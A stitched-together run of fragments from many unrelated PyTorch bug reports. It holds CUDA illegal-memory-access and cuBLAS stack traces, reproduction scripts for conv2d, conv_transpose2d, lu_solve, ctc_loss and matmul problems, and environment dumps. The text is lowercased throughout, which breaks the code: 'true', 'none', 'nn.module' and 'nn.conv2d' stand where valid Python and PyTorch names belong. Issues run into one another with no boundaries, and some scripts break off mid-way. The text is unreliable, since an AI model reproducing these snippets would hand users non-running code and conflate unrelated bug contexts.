runtimeerror: cuda error: an illegal memory access was encountered
terminate called after throwing an instance of 'c10::error' what(): cuda error: an illegal memory access was encountered (insert_events at /pytorch/c10/cuda/cudacachingallocator.cpp:771)
frame #0: c10::error::error(c10::sourcelocation, std::string const&) + ( in /home/tstand/.local/lib/python3.7/site-packages/torch/lib/libc10.so)
frame #1: c10::cuda::cudacachingallocator::raw_delete(void*) + ( in /home/tstand/.local/lib/python3.7/site-packages/torch/lib/libc10_cuda.so)
frame #2: c10::tensorimpl::release_resources() + ( in /home/tstand/.local/lib/python3.7/site-packages/torch/lib/libc10.so)
frame #3: <unknown function> + ( in /home/tstand/.local/lib/python3.7/site-packages/torch/lib/libtorch_python.so)
frame #4: <unknown function> + ( in /home/tstand/.local/lib/python3.7/site-packages/torch/lib/libtorch_python.so)
frame #5: <unknown function> + ( in /home/tstand/anaconda3/bin/python)
frame #6: <unknown function> + ( in /home/tstand/anaconda3/bin/python)
frame #7: <unknown function> + ( in /home/tstand/anaconda3/bin/python)
frame #8: <unknown function> + ( in /home/tstand/anaconda3/bin/python)
frame #9: <unknown function> + ( in /home/tstand/anaconda3/bin/python)
frame #10: pydict_setitem + ( in /home/tstand/anaconda3/bin/python)
frame #11: pydict_setitemstring + ( in /home/tstand/anaconda3/bin/python)
frame #12: pyimport_cleanup + ( in /home/tstand/anaconda3/bin/python)
frame #13: py_finalizeex + ( in /home/tstand/anaconda3/bin/python)
frame #14: <unknown function> + ( in /home/tstand/anaconda3/bin/python)
frame #15: _py_unixmain + ( in /home/tstand/anaconda3/bin/python)
frame #16: __libc_start_main + ( in /lib/x86_64-linux-gnu/libc.so.6)
frame #17: <unknown function> + ( in /home/tstand/anaconda3/bin/python) thcudacheck fail file=/pytorch/aten/src/thc/thccachinghostallocator.cpp line=278 error=700 : an illegal memory access was encountered
traceback (most recent call last): file "main_amp.py", line 542, in <module> main() file "main_amp.py", line 247, in main train(train_loader, model, criterion, optimizer, epoch) file "main_amp.py", line 353, in train scaled_loss.backward() file "/home/tstand/anaconda3/lib/python3.7/contextlib.py", line 119, in __exit__ next(self.gen) file "/home/tstand/anaconda3/lib/python3.7/site-packages/apex/amp/handle.py", line 123, in scale_loss optimizer._post_amp_backward(loss_scaler) file "/home/tstand/anaconda3/lib/python3.7/site-packages/apex/amp/_process_optimizer.py", line 249, in post_backward_no_master_weights post_backward_models_are_masters(scaler, params, stashed_grads) file "/home/tstand/anaconda3/lib/python3.7/site-packages/apex/amp/_process_optimizer.py", line 135, in post_backward_models_are_masters scale_override=(grads_have_scale, stashed_have_scale, out_scale)) file "/home/tstand/anaconda3/lib/python3.7/site-packages/apex/amp/scaler.py", line 184, in unscale_with_stashed out_scale/stashed_have_scale) file "/home/tstand/anaconda3/lib/python3.7/site-packages/apex/amp/scaler.py", line 148, in unscale_with_stashed_python self.dynamic) file "/home/tstand/anaconda3/lib/python3.7/site-packages/apex/amp/scaler.py", line 22, in axpby_check_overflow_python cpu_sum = float(model_grad.float().sum())
runtimeerror: cuda error: an illegal memory access was encountered
terminate called after throwing an instance of 'c10::error' what(): cuda error: an illegal memory access was encountered (insert_events at /pytorch/c10/cuda/cudacachingallocator.cpp:771)
frame #0: c10::error::error(c10::sourcelocation, std::string const&) + ( in /home/tstand/.local/lib/python3.7/site-packages/torch/lib/libc10.so)
frame #1: c10::cuda::cudacachingallocator::raw_delete(void*) + ( in /home/tstand/.local/lib/python3.7/site-packages/torch/lib/libc10_cuda.so)
frame #2: c10::tensorimpl::release_resources() + ( in /home/tstand/.local/lib/python3.7/site-packages/torch/lib/libc10.so)
frame #3: <unknown function> + ( in /home/tstand/.local/lib/python3.7/site-packages/torch/lib/libtorch_python.so)
frame #4: <unknown function> + ( in /home/tstand/.local/lib/python3.7/site-packages/torch/lib/libtorch_python.so)
frame #5: <unknown function> + ( in /home/tstand/anaconda3/bin/python)
frame #6: <unknown function> + ( in /home/tstand/anaconda3/bin/python)
frame #7: <unknown function> + ( in /home/tstand/anaconda3/bin/python)
frame #8: <unknown function> + ( in /home/tstand/anaconda3/bin/python)
frame #9: <unknown function> + ( in /home/tstand/anaconda3/bin/python)
frame #10: pydict_setitem + ( in /home/tstand/anaconda3/bin/python)
frame #11: pydict_setitemstring + ( in /home/tstand/anaconda3/bin/python)
frame #12: pyimport_cleanup + ( in /home/tstand/anaconda3/bin/python)
frame #13: py_finalizeex + ( in /home/tstand/anaconda3/bin/python)
frame #14: <unknown function> + ( in /home/tstand/anaconda3/bin/python)
frame #15: _py_unixmain + ( in /home/tstand/anaconda3/bin/python)
frame #16: __libc_start_main + ( in /lib/x86_64-linux-gnu/libc.so.6)
frame #17: <unknown function> + ( in /home/tstand/anaconda3/bin/python) collecting environment information...
pytorch version: 1.5.0
is debug build: no
cuda used to build pytorch: 10.2 os: ubuntu 19.10
gcc version: (ubuntu 9.2.1-9ubuntu2) 9.2.1 20191008
cmake version: could not collect python version: 3.7
is cuda available: yes
cuda runtime version: could not collect (not installed outside pytorch)
gpu models and configuration: gpu 0: titan rtx
gpu 1: titan rtx nvidia driver version: 440.82
cudnn version: could not collect (not installed outside pytorch) versions of relevant libraries:
[pip3] numpy==1.18.3
[pip3] torch==1.5.0
[pip3] torchvision==0.6.0
[conda] blas 1.0 mkl [conda] cudatoolkit 10.2.89 hfd86e86_0 [conda] mkl 2020.0 166 [conda] mkl-service 2.3.0 py37he904b0f_0 [conda] mkl_fft 1.0.15 py37ha843d7b_0 [conda] mkl_random 1.1.0 py37hd6b4f25_0 [conda] numpy 1.18.1 py37h4f9e942_0 [conda] numpy-base 1.18.1 py37hde5b4d6_1 [conda] numpydoc 0.9.2 py_0 conda-forge
[conda] pytorch 1.5.0 py3.7_cuda10.2.89_cudnn7.6.5_0 pytorch
[conda] torchvision 0.6.0 py37_cu102 pytorch cc @ezyang @gchanan @zou3519 @seemethere @malfet @ngimel @csarofeen @ptrblck
steps to reproduce the behavior: 1
install pytorch 1.5.0 through conda.
install fairseq to the conda environment from source
run a multi-gpu training run on fairseq
this may not work on a different system, but `out.sum().backward()` reliably fails for me at iteration 48.
import torch dtype = torch.half for i in range(0,500): torch.cuda.manual_seed(17) # dummy tensors to fuzz where convtranspose2d inputs get allocated dummy0 = torch.empty((7777*i,), device="cuda", dtype=dtype) a = torch.randn((6, 256, 50, 50), device="cuda", dtype=dtype) dummy1 = torch.empty((7777*i,), device="cuda", dtype=dtype) # shape from cyclegan m = torch.nn.convtranspose2d(256, 128, kernel_size=3, stride=2, padding=1, output_padding=1, bias=true).cuda().to(dtype) dummy2 = torch.empty((7777*i,), device="cuda", dtype=dtype) out = m(a) out.sum().backward() print(i, "weight grad sum = ", m.weight.grad.data.double().sum().item() if m.weight.grad is not none else none, "bias grad sum = ", m.bias.grad.data.double().sum().item() if m.bias.grad is not none else none) m.zero_grad()
``` stack trace with `cuda_launch_blocking=1`
(weight grad and bias grad sums are deterministic for the first 47 iterations)
weight grad sum = 1366953.875 bias grad sum = 98304.0
47 torch.size([6, 128, 100, 100]) 140174484123648 140173632753664 140173635366912
weight grad sum = 1366953.875 bias grad sum = 98304.0
48 torch.size([6, 128, 100, 100]) 140174476443648 140173636979712 140173633344000
traceback (most recent call last): file "transpose2d.py", line 131, in <module> out.sum().backward() file "/home/mcarilli/anaconda3/envs/python373/lib/python3.7/site-packages/torch/tensor.py", line 198, in backward torch.autograd.backward(self, gradient, retain_graph, create_graph) file "/home/mcarilli/anaconda3/envs/python373/lib/python3.7/site-packages/torch/autograd/__init__.py", line 100, in backward allow_unreachable=true) # allow_unreachable flag
runtimeerror: cuda error: cublas_status_execution_failed when calling `cublasgemmex( handle, opa, opb, m, n, k, &falpha, a, cuda_r_16f, lda, b, cuda_r_16f, ldb, &fbeta, c, cuda_r_16f, ldc, cuda_r_32f, cublas_gemm_dfalt_tensor_op)` (gemm<c10::half> at ../aten/src/aten/cuda/cudablas.cpp:226)
frame #0: c10::error::error(c10::sourcelocation, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&) + ( in /home/mcarilli/anaconda3/envs/python373/lib/python3.7/site-packages/torch/lib/libc10.so)
frame #1: <unknown function> + ( in /home/mcarilli/anaconda3/envs/python373/lib/python3.7/site-packages/torch/lib/libtorch_cuda.so)
frame #2: <unknown function> + ( in /home/mcarilli/anaconda3/envs/python373/lib/python3.7/site-packages/torch/lib/libtorch_cuda.so)
frame #3: at::native::(anonymous namespace)::slow_conv_transpose2d_acc_grad_parameters_cuda_template(at::tensor const&, at::tensor const&, at::tensor&, at::tensor&, at::tensor const&, at::tensor const&, c10::arrayref<long>, c10::arrayref<long>, c10::arrayref<long>, c10::arrayref<long>, c10::arrayref<long>, int) + ( in /home/mcarilli/anaconda3/envs/python373/lib/python3.7/site-packages/torch/lib/libtorch_cuda.so)
frame #4: at::native::slow_conv_transpose2d_backward_cuda(at::tensor const&, at::tensor const&, at::tensor const&, c10::arrayref<long>, c10::arrayref<long>, c10::arrayref<long>, c10::arrayref<long>, c10::arrayref<long>, at::tensor const&, at::tensor const&, std::array<bool, 3ul>) + ( in /home/mcarilli/anaconda3/envs/python373/lib/python3.7/site-packages/torch/lib/libtorch_cuda.so)
frame #5: <unknown function> + ( in /home/mcarilli/anaconda3/envs/python373/lib/python3.7/site-packages/torch/lib/libtorch_cuda.so)
frame #6: <unknown function> + ( in /home/mcarilli/anaconda3/envs/python373/lib/python3.7/site-packages/torch/lib/libtorch_cuda.so)
frame #7: <unknown function> + ( in /home/mcarilli/anaconda3/envs/python373/lib/python3.7/site-packages/torch/lib/libtorch_cpu.so)
frame #8: <unknown function> + ( in /home/mcarilli/anaconda3/envs/python373/lib/python3.7/site-packages/torch/lib/libtorch_cpu.so)
frame #9: torch::autograd::generated::slowconvtranspose2dbackward::apply(std::vector<at::tensor, std::allocator<at::tensor> >&&) + ( in /home/mcarilli/anaconda3/envs/python373/lib/python3.7/site-packages/torch/lib/libtorch_cpu.so)
``` `cuda-memcheck --tool memcheck python transpose2d.py` reports a bunch of invalid reads like
``` invalid __global__ read of size 2
========= at in void gemv2t_kernel_val<int, int, __half, __half, float, int=128, int=16, int=2, int=2, bool=0, cublasgemvparams<cublasgemvtensorstridedbatched<__half const >, cublasgemvtensorstridedbatched<__half>, float>>(__half const , float, float)
========= by thread (112,0,0) in block (768,0,0)
========= address is out of bounds
========= device frame:void gemv2t_kernel_val<int, int, __half, __half, float, int=128, int=16, int=2, int=2, bool=0, cublasgemvparams<cublasgemvtensorstridedbatched<__half const >, cublasgemvtensorstridedbatched<__half>, float>>(__half const , float, float) (void gemv2t_kernel
_val<int, int, __half, __half, float, int=128, int=16, int=2, int=2, bool=0, cublasgemvparams<cublasgemvtensorstridedbatched<__half const >, cublasgemvtensorstridedbatched<__half>, float>>(__half const , float, float) : )
========= host frame:/home/mcarilli/anaconda3/envs/python373/lib/python3.7/site-packages/torch/lib/libtorch_cuda.so (_zn2at6native97_global__n__73_tmpxft_00003c73_00000000_7_naiveconvolutiontranspose2d_compute_61_cpp1_ii_1a68c69d55slow_conv_transpose2d_acc_grad_parameters_cuda_
templateerkns_6tensores4_rs2_s5_s4_s4_n3c108arrayrefilees8_s8_s8_s8_i + ) [ ]
import torch # works for (1, 3, 3)
a = torch.rand(1, 1109, 1109) # works on the cpu
a = a.cuda() b = torch.eye(a.shape[1], dtype=a.dtype, device=a.device).expand(a.shape[0], -1, -1) # works for unbatched data
# b = b[0] lu_data, pivots = torch.lu(a)
torch.lu_solve(b, lu_data, pivots)
``` > ---------------------------------------------------------------------------
> runtimeerror traceback (most recent call last)
> /pool01/home/twoertwe/test.py in <module>
> 13 > 14 lu_data, pivots = torch.lu(a)
> ---> 15 torch.lu_solve(b, lu_data, pivots)
> > runtimeerror: cuda error: invalid configuration argument
here's a test function, in which i convolve x 0 0 0 0 0
0 0 1 1 1 0 0 1 1 1 with k 1 1 1 1 1
1 1 0 0 0 on cpu, the output is 0 (expected)
on gpu, the output varies depending on channel count of x
```
import torch
def test(c): x = torch.ones(1, c, 5, 5) x[:,:,:2]=0 x[:,:,:,:2]=0 k = 1-x print(torch.nn.functional.conv2d(x.cuda(), k.cuda())) print(torch.nn.functional.conv2d(x.cpu(), k.cpu())) test(32)
tensor([[[[-1.9055e-05]]]], device='cuda:0')
tensor([[[[0.]]]]) test(320) tensor([[[[-0.1693]]]], device='cuda:0')
tensor([[[[0.]]]]) test(640) tensor([[[[5.0290]]]], device='cuda:0')
tensor([[[[0.]]]]) ```
import torch
import torch.nn as nn hidden_dim = 256
kernel_size = 769
stride = 64
padding = kernel_size // 2
samples = torch.randn([25, 1, 240640])
# zeros padding mode would work
conv1d_zeros = nn.conv1d( 1, hidden_dim, kernel_size=kernel_size, stride=stride, padding=padding, padding_mode='zeros', )
res1 = conv1d_zeros(samples)
print(res1.size())
torch.size([25, 256, 3760])
# padding mode other than zeros would crash with "code is too big"
conv1d_reflect = nn.conv1d( 1, hidden_dim, kernel_size=kernel_size, stride=stride, padding=padding, padding_mode='reflect', )
res2 = conv1d_reflect(samples)
print(res2.size())
code is too big
---------------------------------------------------------------------------
runtimeerror traceback (most recent call last)
<ipython-input-100-8976b1b809cc> in <module> 8 padding_mode='reflect', 9 )
---> 10 res2 = conv1d_reflect(samples) 11 print(res2.size())
/mnt/xarfuse/uid-133626/39eb9d9a-ns-4026531840/torch/nn/modules/module.py in __call__(self, *input, **kwargs) 538 result = self._slow_forward(*input, **kwargs) 539 else:
--> 540 result = self.forward(*input, **kwargs) 541 for hook in self._forward_hooks.values(): 542 hook_result = hook(self, input, result)
/mnt/xarfuse/uid-133626/39eb9d9a-ns-4026531840/torch/nn/modules/conv.py in forward(self, input) 203 return f.conv1d(f.pad(input, self._padding_repeated_twice, mode=self.padding_mode), 204 self.weight, self.bias, self.stride,
--> 205 _single(0), self.dilation, self.groups) 206 return f.conv1d(input, self.weight, self.bias, self.stride, 207 self.padding, self.dilation, self.groups)
runtimeerror: code is too big
# padding with zero padding size would crash with "code is too big"
conv1d_zeros_no_pad = nn.conv1d( 1, hidden_dim, kernel_size=kernel_size, stride=stride, padding=0, padding_mode='zeros', )
res3 = conv1d_zeros_no_pad(samples)
print(res3.size())
code is too big
---------------------------------------------------------------------------
runtimeerror traceback (most recent call last)
<ipython-input-101-c6945a8c13d3> in <module> 8 padding_mode='zeros', 9 )
---> 10 res3 = conv1d_zeros_no_pad(samples) 11 print(res3.size())
/mnt/xarfuse/uid-133626/39eb9d9a-ns-4026531840/torch/nn/modules/module.py in __call__(self, *input, **kwargs) 538 result = self._slow_forward(*input, **kwargs) 539 else:
--> 540 result = self.forward(*input, **kwargs) 541 for hook in self._forward_hooks.values(): 542 hook_result = hook(self, input, result)
/mnt/xarfuse/uid-133626/39eb9d9a-ns-4026531840/torch/nn/modules/conv.py in forward(self, input) 205 _single(0), self.dilation, self.groups) 206 return f.conv1d(input, self.weight, self.bias, self.stride,
--> 207 self.padding, self.dilation, self.groups) 208 209 runtimeerror: code is too big
``` - pytorch version (e.g., '1.5.0a0-fb'): - os: centos linux - how you installed pytorch: `conda`
- python version: 3.7.5+ - cuda/cudnn version: n/a - gpu models and configuration: n/a - any other relevant information: n/a cc @ezyang @gchanan @zou3519 @gujinghui @penghuicheng @xiaobingsuper @jianyuh
steps to reproduce the behavior: 1
install torch-1.4.0
run below code snippet ```python
import torch
from torch import nn, optim
from torch.nn import functional as f # define model
class themodelclass(nn.module): def __init__(self): super(themodelclass, self).__init__() self.conv1 = nn.conv2d(3, 6, 5) self.pool = nn.maxpool2d(2, 2) self.conv2 = nn.conv2d(6, 16, 5) self.fc1 = nn.linear(16 * 5 * 5, 120) self.fc2 = nn.linear(120, 84) self.fc3 = nn.linear(84, 10) def forward(self, x): x = self.pool(f.relu(self.conv1(x))) x = self.pool(f.relu(self.conv2(x))) x = x.view(-1, 16 * 5 * 5) x = f.relu(self.fc1(x)) x = f.relu(self.fc2(x)) x = self.fc3(x) return x # initialize model
model = themodelclass() # initialize optimizer
optimizer = optim.sgd(model.parameters(), lr=0.001, momentum=0.9) # print model's state_dict
print("model\'s state_dict:")
for param_tensor in model.state_dict(): print(param_tensor, "\\t", model.state_dict()[param_tensor].size()) # print optimizer\'s state_dict
print("optimizer\'s state_dict:")
for var_name in optimizer.state_dict(): print(var_name, "\\t", optimizer.state_dict()[var_name])
steps to reproduce the behavior: 1
python test_torch.py
import torch as th n = 16909322 #n = 16909321 # << this one won\'t fail k = 127 print(f"allocating {4*n*k / (1024**3)} gb ...") u = th.zeros((n, k), device="cuda:0") print("done.") u = u[:, 0:1] #u = th.zeros_like(u) # << adding this makes the following line succeed for either value of n v = th.mm(u.permute(1, 0), u) #v = (u**2).sum() # << this succeeds for either value of n # just to force the error to propagate up to python, otherwise it will silently # fail and exit
th.cuda.synchronize()
unfortunately, this is a floating bug that depends on the state of the system.
t1 = torch.ones((3,2,0)).cuda(0)
t2 = torch.ones((3,0,3)).cuda(0)
res_bmm = torch.bmm(t1, t2)
res_matmul = torch.matmul(t1, t2)
here is some code to reproduce the problem, which will print the time for a forward and a backward pass on a batch of 32 images with depth 8 and image size 32x32 using 5x5 kernels with a padding of 2 pixels
import time
import numpy as np
import torch
import torch.nn as nn n, c, h, w = (32, 8, 32, 32)
device = torch.device("cpu")
model = nn.conv2d(c, c, 5, padding=2)
model = model.to(device)
model.train()
loss_fn = nn.mseloss() for iteration in range(100): t0 = time.perf_counter() x = torch.from_numpy(np.ones((n, c, h, w), np.float32)).to(device) y = torch.from_numpy(np.ones((n, c, h, w), np.float32)).to(device) loss = loss_fn(model(x), y) t1 = time.perf_counter() loss.backward() t2 = time.perf_counter() print("forward: %f seconds" % (t1 - t0)) print("backward: %f seconds" % (t2 - t1)) print("")
with this code: ```python
import argparse import torch
import torch.nn as nn
import torch.nn.functional as f
import torch.distributed as dist
from torch.optim.lr_scheduler import _lrscheduler
from apex import amp from torch.nn import batchnorm2d class model(nn.module): def __init__(self): super(model, self).__init__() self.conv = nn.conv2d(3, 16, 3, 1, 1) self.bn = batchnorm2d(16) self.act = nn.relu(inplace=true) self.linear = nn.linear(16, 1000) def forward(self, x): feat = self.act(self.bn(self.conv(x))) feat = torch.mean(feat, dim=(2, 3)) logits = self.linear(feat) return logits def main(): model = model() criteria = nn.crossentropyloss() model.cuda() optimizer = torch.optim.sgd( model.parameters(), lr=0.016, weight_decay=1e-5, momentum=0.9 ) lr_scheduler = torch.optim.lr_scheduler.steplr( optimizer, step_size=10, ) model, optimizer = amp.initialize(model, optimizer, opt_level='o1') ims = torch.randn(1, 3, 224, 224).cuda() lbs = torch.randint(0, 1000, (1, )).cuda() logits = model(ims) loss = criteria(logits, lbs) loss.backward() optimizer.step() lr_scheduler.step() if __name__ == '__main__': main() ``` i got the warnining: >
/miniconda/envs/py36/lib/python3.6/site-packages/torch/optim/lr_scheduler.py:113: userwarning: seems like `optimizer.step()` has been overridden after learning rate scheduler initialization
please, make sure to call `optimizer.step()` before `lr_scheduler.step()`
see more details at #how-to-adjust-learning-rate " #how-to-adjust-learning-rate", userwarning) if i do not use `amp.initialize`, there will not be this warning message
cc @vincentqb
or once that pr goes in just re-enable test_cholesky_batched_many_batches
this can also be reproduced by calling magma_dpotrf_batched directly with a tensor allocated by cudamalloc
run under cuda-memcheck to report all illegal memory accesses, including "silent" ones.
you can run this code and test different situations ```
import torch as t
import numpy as np
from torch import nn def main(): print(t.__version__) kernel_size = 7 # 5 conv = nn.conv2d(128, 128, kernel_size, 1, (kernel_size - 1) // 2, bias = false) conv.cuda() x = t.ones([32, 128, 1, 128], device = 'cuda') conv(x) a = input() if __name__ == '__main__': main()
steps to reproduce the behavior: 1
training a fairly large network while almost using all gpu memory (32gb on a tesla v100).
the dataloader is rendering using opengl and then returning cpu tensors
import torch class architecture(torch.nn.module): def __init__(self, n_features, n_classes): super(architecture, self).__init__() self.n_features = n_features self.n_classes = n_classes self.cls = torch.nn.linear(self.n_features, self.n_classes) def forward(self, x): ts, bs = x.shape[:2] x = x.view(ts * bs, self.n_features) x = self.cls(x).view(ts, bs, self.n_classes) x = torch.nn.functional.log_softmax(x, dim=-1) return x batch_size = 2
gt_length = 3
n_timesteps = gt_length * 2
n_features = 5
n_classes = 4 def get_model(): arch = architecture(n_features, n_classes) arch.train() return arch def get_data(): # data features = torch.normal(mean=torch.zeros((n_timesteps, batch_size, n_features), dtype=torch.float32)) pred_lengths = n_timesteps * torch.ones((batch_size,), dtype=torch.int32) targets = torch.randint(1, n_classes, size=(batch_size * gt_length,), dtype=torch.int32) target_lengths = gt_length * torch.ones((batch_size,), dtype=torch.int32) return features, pred_lengths, targets, target_lengths def cast_data(features, pred_lengths, targets, target_lengths, device, dtype): features = features.to(device) pred_lengths = pred_lengths.to(dtype) targets = targets.to(dtype).to(device) target_lengths = target_lengths.to(dtype) if dtype == torch.int32: targets = targets.to(torch.device("cpu")) return features, pred_lengths, targets, target_lengths def run(model, data, device, dtype, loss_mult=1.0): if device == torch.device("cpu"): print("\ # ctc cpu : device {} - dtype {} - mul {}".format(device, dtype, loss_mult)) elif device == torch.device("cuda") and dtype == torch.int32: print("\ # ctc cudnn : device {} - dtype {} - mul {}".format(device, dtype, loss_mult)) elif device == torch.device("cuda") and dtype == torch.long: print("\ # ctc regular : device {} - dtype {} - mul {}".format(device, dtype, loss_mult)) model = model.to(device) features, pred_lengths, targets, target_lengths = cast_data(*data, device, dtype) preds = model(features) # loss loss = torch.nn.functional.ctc_loss(preds, targets, pred_lengths, target_lengths) loss = loss_mult * loss print(\'loss : \', loss) model.zero_grad() loss.backward() for param in model.parameters(): print(\'grad : \', param.grad.abs().mean()) model.zero_grad() data = get_data()
model = get_model() print("----- cpu -----")
run(model, data, torch.device("cpu"), torch.int32)
run(model, data, torch.device("cpu"), torch.long)
run(model, data, torch.device("cpu"), torch.int32, 0.0)
run(model, data, torch.device("cpu"), torch.long, 0.0) print("\ ----- gpu -----")
run(model, data, torch.device("cuda"), torch.int32)
run(model, data, torch.device("cuda"), torch.long)
run(model, data, torch.device("cuda"), torch.int32, 0.0)
run(model, data, torch.device("cuda"), torch.long, 0.0)
on ubuntu, install the following packages:
- python3-venv create a virtual environment by running:
- `python3 -m venv .venv`
- `.venv/bin/pip install torch tensorboard` ```
$ .venv/bin/python -c 'from torch.utils.tensorboard import summarywriter'
(warnings about tf using old numpy apis elided)
traceback (most recent call last): file "<string>", line 1, in <module> file "/mnt/c/users/elis/linux-home/edit/book/code/.venv/lib/python3.5/site-packages/torch/utils/tensorboard/__init__.py", line 6, in <module> from .writer import filewriter, summarywriter # noqa f401 file "/mnt/c/users/elis/linux-home/edit/book/code/.venv/lib/python3.5/site-packages/torch/utils/tensorboard/writer.py", line 18, in <module> from ._convert_np import make_np file "/mnt/c/users/elis/linux-home/edit/book/code/.venv/lib/python3.5/site-packages/torch/utils/tensorboard/_convert_np.py", line 12, in <module> from caffe2.python import workspace file "/mnt/c/users/elis/linux-home/edit/book/code/.venv/lib/python3.5/site-packages/caffe2/python/workspace.py", line 15, in <module> from past.builtins import basestring
importerror: no module named 'past'
running `.venv/bin/pip install future` fixes the problem.
i've put together a minimal docker container capturing the bug [here](
in particular, see [this command]( #l7), which calls [this script](
steps to reproduce the behavior: 1
install pytorch 1.0.2
run the following code on multiple p40 gpus ```
import os ###tutorial from
###no error with only 1 gpu
# os.environ['cuda_visible_devices'] = '0' #### to reproduce error allow multi gpu
os.environ['cuda_visible_devices'] = '0,1,2,3' import torch torch.cuda.device_count() import torch.nn as nn
from torch.utils.data import dataset, dataloader # parameters and dataloaders
input_size = 5000 #increased input size (works with 500 on multi gpu)
output_size = 2000 #increased output size (works with 200 on multi gpu) batch_size = 300
data_size = 100 device = torch.device("cuda:0" if torch.cuda.is_available() else "cpu")
print(device) class randomdataset(dataset): def __init__(self, size, length): self.len = length self.data = torch.randn(length, size) def __getitem__(self, index): return self.data[index] def __len__(self): return self.len rand_loader = dataloader(dataset=randomdataset(input_size, data_size), batch_size=batch_size, shuffle=true) class model(nn.module): # our model def __init__(self, input_size, output_size): super(model, self).__init__() self.fc = nn.linear(input_size, output_size) def forward(self, input): output = self.fc(input) return output model = model(input_size, output_size)
if torch.cuda.device_count() > 1: print("let\'s use", torch.cuda.device_count(), "gpus!") # dim = 0 [30, xxx] -> [10, ...], [10, ...], [10, ...] on 3 gpus model = nn.dataparallel(model) model.to(device) for i in range(10000): for data in rand_loader: input = data.to(device) output = model(input) ```
torch.zeros((16*2**20 - 512)//2 + 1, 1, dtype=torch.float16, device='cuda:0') @ torch.zeros(1, 2, dtype=torch.float16, device='cuda:0')
runtimeerror: cublas runtime error : the gpu program failed to execute at /opt/conda/conda-bld/pytorch_1556653114079/work/aten/src/thc/thcblas.cu:315
``` it also fails if cublasgemmex called via pytorch extension, with stacktrace:
frame #0: c10::error::error(c10::sourcelocation, std::string const&) + ( in /opt/anaconda3/lib/python3.7/site-packages/torch/lib/libc10.so)
frame #1: mm_fp16_fp16_acc32(at::tensor, at::tensor, at::tensor) + ( in /mnt/live/research/hffx/sharedcodes/python/xtx/nn/gemm_11/gemm_bind.cpython-37m-x86_64-linux-gnu.so)
frame #2: <unknown function> + ( in /mnt/live/research/hffx/sharedcodes/python/xtx/nn/gemm_11/gemm_bind.cpython-37m-x86_64-linux-gnu.so)
frame #3: <unknown function> + ( in /mnt/live/research/hffx/sharedcodes/python/xtx/nn/gemm_11/gemm_bind.cpython-37m-x86_64-linux-gnu.so)
frame #4: <unknown function> + ( in /mnt/live/research/hffx/sharedcodes/python/xtx/nn/gemm_11/gemm_bind.cpython-37m-x86_64-linux-gnu.so)
frame #5: _pymethoddef_rawfastcallkeywords + ( in /opt/anaconda3/bin/python)
frame #6: _pycfunction_fastcallkeywords + ( in /opt/anaconda3/bin/python)
frame #7: _pyeval_evalframedefault + ( in /opt/anaconda3/bin/python)
frame #8: _pyeval_evalcodewithname + ( in /opt/anaconda3/bin/python)
frame #9: pyeval_evalcodeex + ( in /opt/anaconda3/bin/python)
frame #10: pyeval_evalcode + ( in /opt/anaconda3/bin/python)
frame #11: <unknown function> + ( in /opt/anaconda3/bin/python)
frame #12: _pymethoddef_rawfastcallkeywords + ( in /opt/anaconda3/bin/python)
frame #13: _pycfunction_fastcallkeywords + ( in /opt/anaconda3/bin/python)
frame #14: _pyeval_evalframedefault + ( in /opt/anaconda3/bin/python)
frame #15: _pyeval_evalcodewithname + ( in /opt/anaconda3/bin/python)
frame #16: _pyfunction_fastcallkeywords + ( in /opt/anaconda3/bin/python)
frame #17: _pyeval_evalframedefault + ( in /opt/anaconda3/bin/python)
frame #18: _pyeval_evalcodewithname + ( in /opt/anaconda3/bin/python)
frame #19: _pyfunction_fastcallkeywords + ( in /opt/anaconda3/bin/python)
frame #20: _pyeval_evalframedefault + ( in /opt/anaconda3/bin/python)
frame #21: _pyeval_evalcodewithname + ( in /opt/anaconda3/bin/python)
frame #22: _pyfunction_fastcallkeywords + ( in /opt/anaconda3/bin/python)
frame #23: _pyeval_evalframedefault + ( in /opt/anaconda3/bin/python)
frame #24: _pyeval_evalcodewithname + ( in /opt/anaconda3/bin/python)
frame #25: _pyfunction_fastcallkeywords + ( in /opt/anaconda3/bin/python)
frame #26: _pyeval_evalframedefault + ( in /opt/anaconda3/bin/python)
frame #27: _pyfunction_fastcallkeywords + ( in /opt/anaconda3/bin/python)
frame #28: _pyeval_evalframedefault + ( in /opt/anaconda3/bin/python)
frame #29: _pyfunction_fastcallkeywords + ( in /opt/anaconda3/bin/python)
frame #30: _pyeval_evalframedefault + ( in /opt/anaconda3/bin/python)
frame #31: _pyeval_evalcodewithname + ( in /opt/anaconda3/bin/python)
frame #32: _pyfunction_fastcallkeywords + ( in /opt/anaconda3/bin/python)
frame #33: _pyeval_evalframedefault + ( in /opt/anaconda3/bin/python)
frame #34: _pyfunction_fastcallkeywords + ( in /opt/anaconda3/bin/python)
frame #35: _pyeval_evalframedefault + ( in /opt/anaconda3/bin/python)
frame #36: _pyfunction_fastcallkeywords + ( in /opt/anaconda3/bin/python)
frame #37: _pyeval_evalframedefault + ( in /opt/anaconda3/bin/python)
frame #38: _pyeval_evalcodewithname + ( in /opt/anaconda3/bin/python)
frame #39: pyeval_evalcodeex + ( in /opt/anaconda3/bin/python)
frame #40: pyeval_evalcode + ( in /opt/anaconda3/bin/python)
frame #41: <unknown function> + ( in /opt/anaconda3/bin/python)
frame #42: pyrun_fileexflags + ( in /opt/anaconda3/bin/python)
frame #43: pyrun_simplefileexflags + ( in /opt/anaconda3/bin/python)
frame #44: <unknown function> + ( in /opt/anaconda3/bin/python)
frame #45: _py_unixmain + ( in /opt/anaconda3/bin/python)
frame #46: __libc_start_main + ( in /lib64/libc.so.6)
frame #47: <unknown function> + ( in /opt/anaconda3/bin/python)
``` it all works as expected for fp32, it also works for fp16 *if* matrix is slightly smaller:
torch.zeros((16*2**20 - 512)//2, 1, dtype=torch.float16, device='cuda:0') @ torch.zeros(1, 2, dtype=torch.float16, device='cuda:0')
steps to reproduce the behavior:
generate the following random matrices
a = torch.randn((11111111, 20), device=torch.device("cuda"))
b = torch.randn((20, 2), device=torch.device("cuda"))
then `(a @ b)[8807984:]` must be the same as `a[8807984:] @ b`
but it is not the case! minimal example:
a = torch.randn((11111111, 20), device=torch.device("cuda"))
b = torch.randn((20, 2), device=torch.device("cuda"))
print((a @ b)[8807984:].equal(a[8807984:] @ b))
returns `false`
import torch as tr
from torch.autograd import variable
import torch.nn as nn
from torch import autograd import time
from copy import deepcopy
from datetime import datetime
starttime = datetime.now() import torch.nn as nn
import torch.nn.functional as f
